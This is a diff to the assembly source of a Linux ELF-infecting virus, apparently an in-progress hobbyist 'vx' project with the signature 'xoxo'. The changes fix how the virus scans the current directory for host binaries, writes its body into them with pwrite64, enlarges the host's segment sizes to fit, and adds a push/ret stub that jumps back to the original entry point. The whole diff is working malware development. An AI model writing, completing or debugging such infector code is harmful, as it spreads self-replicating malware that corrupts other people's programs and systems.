@@ -489,6 +489,7 @@ section .text
 global _start
 _start:
 	jmp vxstart
+	;db 0x78,0x6f,0x78,0x6f
 	vxsig: db "xoxo",0
 vxstart:
 	push rbp
@@ -496,6 +497,7 @@ vxstart:
 	sub rsp, 0x1000
 	mov r14, rsp
 	jmp get_cwd
+
 
 _getdirents:
 ;****************************************************************************************
@@ -519,7 +521,7 @@ _getdirents:
 
 get_cwd:
 	call _getdirents
-	targetdir: db ".", 0
+	targetdir: db ".",0
 	
 ;****************************************************************************************
 ; getdents64 - syscall 0x4e
@@ -922,8 +924,8 @@ infect:
 					;mov dword [hosttext_start], r10d
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov dword [vxoffset], r10d
-					add qword [r13 + r12 + 32], vlen	;elf_phdr.p_filesz offset
-					add qword [r13 + r12 + 40], vlen	;elf_phdr.p_memsz offset
+					add qword [r13 + r12 + 32], vlen+6	;elf_phdr.p_filesz offset
+					add qword [r13 + r12 + 40], vlen+6	;elf_phdr.p_memsz offset
 					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
 ;				.mod_phdr_data_segment:			
 ;					mov r11, [r13 + r12 + 8]			;elf_phdr.p_offset  
@@ -1075,7 +1077,7 @@ infect:
 ;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
 ;	write any padding bytes needed to maintain page alignment for temp file
 ;	write remaining segments [data segment to original Shdr offset] from host ELF to .xo.tmp
-;	write modified section header table to .xo.tmp
+;	write modified section header table of mmap'ed host to .xo.tmp
 ;	copy (write) remaining bytes (end of SHdr table to EOF) from host ELF to .xo.tmp
 ;	
 ;	TODO: add routine for renaming .xo.tmp to original host file name
@@ -1128,16 +1130,18 @@ frankenstein_elf:
 		mov rdi, r9
 		mov rdx, vlen
 		lea rsi, [rax + _start]
+		;add rsi, _start
+		;sub rsi, (vxstart - _start)
 		mov r10d, dword [vxoffset]
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.write_jmp_to_oep:
 		mov rdx, 6
-		mov byte [r14 + 150], 0x68			;0x68 = push
-		mov dword [r14 + 151], r8d			;address of original host entry point
-		mov byte [r14 + 155], 0xc3			;0xc3 = ret
-		lea rsi, [r14+ 150]
+		mov byte [r14 + 180], 0x68			;0x68 = push
+		mov dword [r14 + 181], r8d			;address of original host entry point
+		mov byte [r14 + 185], 0xc3			;0xc3 = ret
+		lea rsi, [r14+ 180]
 		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
 		;mov rax, SYS_PWRITE64
@@ -1212,7 +1216,7 @@ frankenstein_elf:
 		syscall
 
 	.munmap_file_work_area:
-		mov rdi, r13			;munmap file from work area
+		lea rdi, [r13]			;munmap file from work area
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rax, SYS_MUNMAP
 		syscall
